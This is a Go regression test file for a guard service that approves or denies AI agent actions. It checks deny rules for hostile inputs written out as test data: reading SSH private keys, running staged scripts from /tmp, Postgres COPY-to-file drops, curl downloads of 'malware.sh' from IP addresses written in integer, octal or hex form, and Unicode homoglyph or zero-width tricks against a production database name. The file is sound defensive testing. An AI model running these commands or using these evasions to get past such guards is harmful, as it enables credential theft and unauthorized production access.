package server

import (
	"encoding/json"
	"net/http"
	"testing"

	"github.com/metabbe3/cerberus/internal/engine"
)

// Regression tests for MC-P1 fix batch.

// FIX-1: (OP02+S07) shellguard arg-shape fail-closed.
// tool_call dengan args yang TIDAK punya salah satu key cmd|command|script -> DENY shellguard.unparseable.
func TestRegression_MC_P1_Fix1_ShellGuardArgShape(t *testing.T) {
	t.Setenv("CERBERUS_OPEN_KEY_MODE", "1")
	h := newHarness(t)

	variants := []struct {
		name    string
		argKey  string
		argVal  any
	}{
		{"exec_key", "exec", "cat ~/.ssh/id_rsa"},
		{"argv_key", "argv", "cat ~/.ssh/id_rsa"},
		{"run_key", "run", "cat ~/.ssh/id_rsa"},
		{"execute_key", "execute", "cat ~/.ssh/id_rsa"},
		{"command_line_key", "command_line", "cat ~/.ssh/id_rsa"},
	}

	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			payload := map[string]any{
				"stage":     "tool",
				"key_id":    "k-open",
				"tool_call": "runner",
				"args": map[string]any{
					v.argKey: v.argVal,
				},
			}
			reqBytes, _ := json.Marshal(payload)
			resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status = %d, want 200", resp.StatusCode)
			}
			d := decodeJSON[engine.Decision](t, resp.Body)
			if d.Decision != "deny" {
				t.Errorf("[%s] decision = %q, want 'deny'", v.name, d.Decision)
			}
			if d.RuleID != "shellguard.unparseable" {
				t.Errorf("[%s] rule_id = %q, want 'shellguard.unparseable'", v.name, d.RuleID)
			}
		})
	}

	// Tool call "runner" missing standard command keys entirely
	t.Run("runner_missing_cmd_entirely", func(t *testing.T) {
		payload := map[string]any{
			"stage":     "tool",
			"key_id":    "k-open",
			"tool_call": "runner",
			"args": map[string]any{
				"foo": "bar",
			},
		}
		reqBytes, _ := json.Marshal(payload)
		resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
		d := decodeJSON[engine.Decision](t, resp.Body)
		if d.Decision != "deny" || d.RuleID != "shellguard.unparseable" {
			t.Errorf("got %s/%s, want deny/shellguard.unparseable", d.Decision, d.RuleID)
		}
	})
}

// FIX-2: (S05) docker inspect container terproteksi.
// action inspect|logs|stats pada container di shield.prod.protected_containers -> DENY shield.container.protected.
func TestRegression_MC_P1_Fix2_DockerInspectProtected(t *testing.T) {
	t.Setenv("CERBERUS_OPEN_KEY_MODE", "1")
	h := newHarness(t)

	// Actions inspect, logs, stats on protected container "teknikalidnew-db-1"
	actions := []string{"inspect", "logs", "stats"}
	for _, act := range actions {
		t.Run(act+"_protected", func(t *testing.T) {
			payload := map[string]any{
				"stage":    "docker",
				"key_id":   "k-open",
				"action":   act,
				"resource": "teknikalidnew-db-1",
			}
			reqBytes, _ := json.Marshal(payload)
			resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status = %d, want 200", resp.StatusCode)
			}
			d := decodeJSON[engine.Decision](t, resp.Body)
			if d.Decision != "deny" {
				t.Errorf("[%s] decision = %q, want 'deny'", act, d.Decision)
			}
			if d.RuleID != "shield.container.protected" {
				t.Errorf("[%s] rule_id = %q, want 'shield.container.protected'", act, d.RuleID)
			}
		})
	}

	// Action inspect on non-protected container -> allow
	t.Run("inspect_non_protected_allowed", func(t *testing.T) {
		payload := map[string]any{
			"stage":    "docker",
			"key_id":   "k-open",
			"action":   "inspect",
			"resource": "worker-app-1",
		}
		reqBytes, _ := json.Marshal(payload)
		resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
		d := decodeJSON[engine.Decision](t, resp.Body)
		if d.Decision != "allow" {
			t.Errorf("decision = %q, want 'allow'", d.Decision)
		}
		if d.RuleID != "docker.allow" {
			t.Errorf("rule_id = %q, want 'docker.allow'", d.RuleID)
		}
	})
}

// FIX-3: (S04) SSH exec staged-script + taint-sink SSH.
// exec command yang mengeksekusi file dari path writable-dunia (/tmp/, /var/tmp/, /dev/shm/) -> DENY ssh.staged_script_forbidden.
// Sink taint engine: action ssh exec/include dalam daftar sink egress (chain.tainted_exfil).
func TestRegression_MC_P1_Fix3_SSHStagedScriptAndTaint(t *testing.T) {
	t.Setenv("CERBERUS_OPEN_KEY_MODE", "1")
	h := newHarness(t)

	cases := []struct {
		name         string
		cmd          string
		wantDecision string
		wantRuleID   string
	}{
		{"sh_tmp", "sh /tmp/p.sh", "deny", "ssh.staged_script_forbidden"},
		{"bash_var_tmp", "bash /var/tmp/x.sh", "deny", "ssh.staged_script_forbidden"},
		{"proper_path", "/opt/deploy/run.sh", "allow", "ssh.allow"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			payload := map[string]any{
				"stage":   "ssh",
				"key_id":  "k-open",
				"action":  "exec",
				"host":    "app.teknikal.id",
				"user":    "deploy",
				"command": c.cmd,
			}
			reqBytes, _ := json.Marshal(payload)
			resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status = %d, want 200", resp.StatusCode)
			}
			d := decodeJSON[engine.Decision](t, resp.Body)
			if d.Decision != c.wantDecision {
				t.Errorf("[%s] decision = %q, want %q", c.name, d.Decision, c.wantDecision)
			}
			if d.RuleID != c.wantRuleID {
				t.Errorf("[%s] rule_id = %q, want %q", c.name, d.RuleID, c.wantRuleID)
			}
		})
	}

	// S04 Step-1 (file drop) -> Step-2 (SSH exec) in same session denied via taint
	t.Run("S04_step2_denied_via_taint", func(t *testing.T) {
		// Step 1: Tool writes to /tmp/p.sh
		step1Body := `{
			"stage": "tool",
			"key_id": "k-open",
			"session_id": "s04-taint-session",
			"tool_call": "shell_run",
			"args": {"cmd": "echo 'safe' > /tmp/p.sh"}
		}`
		resp1 := h.do(t, http.MethodPost, "/v1/decide", "application/json", step1Body, false)
		d1 := decodeJSON[engine.Decision](t, resp1.Body)
		if d1.Decision != "allow" {
			t.Fatalf("step 1 should be allowed, got %s/%s", d1.Decision, d1.RuleID)
		}

		// Step 2: SSH exec in same session must be blocked by taint
		step2Body := `{
			"stage": "ssh",
			"key_id": "k-open",
			"session_id": "s04-taint-session",
			"action": "exec",
			"host": "app.teknikal.id",
			"user": "deploy",
			"command": "/opt/deploy/run.sh"
		}`
		resp2 := h.do(t, http.MethodPost, "/v1/decide", "application/json", step2Body, false)
		d2 := decodeJSON[engine.Decision](t, resp2.Body)
		if d2.Decision != "deny" || d2.RuleID != "chain.tainted_exfil" {
			t.Fatalf("step 2: got %s/%s, want deny/chain.tainted_exfil", d2.Decision, d2.RuleID)
		}
	})
}

// FIX-4: (S10) db COPY..TO file-drop + taint-sink db write.
// statement COPY ... TO 'file' (bukan TO PROGRAM) -> DENY db.file_drop_forbidden (COPY TO STDOUT tetap allow).
func TestRegression_MC_P1_Fix4_DBCopyToFileDrop(t *testing.T) {
	t.Setenv("CERBERUS_OPEN_KEY_MODE", "1")
	h := newHarness(t)

	// Case 1: COPY TO '/tmp/f' -> DENY db.file_drop_forbidden
	t.Run("copy_to_file_denied", func(t *testing.T) {
		payload := map[string]any{
			"stage":     "db",
			"key_id":    "k-open",
			"tool_call": "sql_exec",
			"args": map[string]any{
				"dialect":  "postgres",
				"database": "app-db",
				"sql":      "COPY (SELECT * FROM orders LIMIT 9) TO '/tmp/f'",
			},
		}
		reqBytes, _ := json.Marshal(payload)
		resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("status = %d, want 200", resp.StatusCode)
		}
		d := decodeJSON[engine.Decision](t, resp.Body)
		if d.Decision != "deny" {
			t.Errorf("decision = %q, want 'deny'", d.Decision)
		}
		if d.RuleID != "db.file_drop_forbidden" {
			t.Errorf("rule_id = %q, want 'db.file_drop_forbidden'", d.RuleID)
		}
	})

	// Case 2: COPY TO STDOUT -> ALLOW db.allow
	t.Run("copy_to_stdout_allowed", func(t *testing.T) {
		payload := map[string]any{
			"stage":     "db",
			"key_id":    "k-open",
			"tool_call": "sql_exec",
			"args": map[string]any{
				"dialect":  "postgres",
				"database": "app-db",
				"sql":      "COPY (SELECT 1) TO STDOUT",
			},
		}
		reqBytes, _ := json.Marshal(payload)
		resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("status = %d, want 200", resp.StatusCode)
		}
		d := decodeJSON[engine.Decision](t, resp.Body)
		if d.Decision != "allow" {
			t.Errorf("decision = %q, want 'allow'", d.Decision)
		}
		if d.RuleID != "db.allow" {
			t.Errorf("rule_id = %q, want 'db.allow'", d.RuleID)
		}
	})
}

// FIX-5: (S11) tool curl IP non-desimal + S12 unicode word-joiner di normalize.
// - IP-normalizer: terima bentuk integer (167772161), oktal (012.0.0.1), hex (0x0a000001) di args.cmd http:// host token -> konversi ke dotted lalu cek CIDR shield -> DENY shield.prod.ip_blocked.
// - normalize() di engine/authz: strip word-joiner \u2060, soft-hyphen \u00ad, BOM \ufeff dari SEMUA field string input (prompt, args values, host, database) sebelum evaluasi.
// - S12: pr\u2060od-db -> prod-db -> DENY shield.prod.no_access; homoglyph Cyrillic pгod (U+0433) -> DENY shield.prod.no_access.
func TestRegression_MC_P1_Fix5_IPNormalizerAndUnicodeHomoglyph(t *testing.T) {
	t.Setenv("CERBERUS_OPEN_KEY_MODE", "1")
	h := newHarness(t)

	// S11: Tool curl with alternative IP encodings pointing to prod CIDR (10.0.0.1)
	ipVariants := []struct {
		name string
		cmd  string
	}{
		{"integer_ip", "curl http://167772161/malware.sh -o /tmp/p.sh"},
		{"octal_ip", "curl http://012.0.0.1/malware.sh -o /tmp/p.sh"},
		{"hex_ip", "curl http://0x0a000001/malware.sh -o /tmp/p.sh"},
	}

	for _, v := range ipVariants {
		t.Run("s11_"+v.name, func(t *testing.T) {
			payload := map[string]any{
				"stage":     "tool",
				"key_id":    "k-open",
				"tool_call": "shell_run",
				"args": map[string]any{
					"cmd": v.cmd,
				},
			}
			reqBytes, _ := json.Marshal(payload)
			resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status = %d, want 200", resp.StatusCode)
			}
			d := decodeJSON[engine.Decision](t, resp.Body)
			if d.Decision != "deny" {
				t.Errorf("[%s] decision = %q, want 'deny'", v.name, d.Decision)
			}
			if d.RuleID != "shield.prod.ip_blocked" {
				t.Errorf("[%s] rule_id = %q, want 'shield.prod.ip_blocked'", v.name, d.RuleID)
			}
		})
	}

	// S12: Unicode word-joiner, soft-hyphen, BOM, and Cyrillic homoglyphs in args.database
	dbVariants := []struct {
		name string
		db   string
	}{
		{"word_joiner", "pr\u2060od-db"},
		{"soft_hyphen", "pr\u00adod-db"},
		{"bom", "\ufeffprod-db"},
		{"zero_width_space", "pr\u200bod-db"},
		{"cyrillic_homoglyph_g", "p\u0433od-db"}, // Cyrillic г (U+0433) -> r
		{"cyrillic_homoglyph_p_o", "\u0440r\u043ed-db"}, // Cyrillic р (U+0440) -> p, Cyrillic о (U+043E) -> o
	}

	for _, v := range dbVariants {
		t.Run("s12_"+v.name, func(t *testing.T) {
			payload := map[string]any{
				"stage":     "db",
				"key_id":    "k-open",
				"tool_call": "sql_exec",
				"args": map[string]any{
					"dialect":  "postgres",
					"database": v.db,
					"sql":      "SELECT 1",
				},
			}
			reqBytes, _ := json.Marshal(payload)
			resp := h.do(t, http.MethodPost, "/v1/decide", "application/json", string(reqBytes), false)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status = %d, want 200", resp.StatusCode)
			}
			d := decodeJSON[engine.Decision](t, resp.Body)
			if d.Decision != "deny" {
				t.Errorf("[%s] decision = %q, want 'deny'", v.name, d.Decision)
			}
			if d.RuleID != "shield.prod.no_access" {
				t.Errorf("[%s] rule_id = %q, want 'shield.prod.no_access'", v.name, d.RuleID)
			}
		})
	}
}

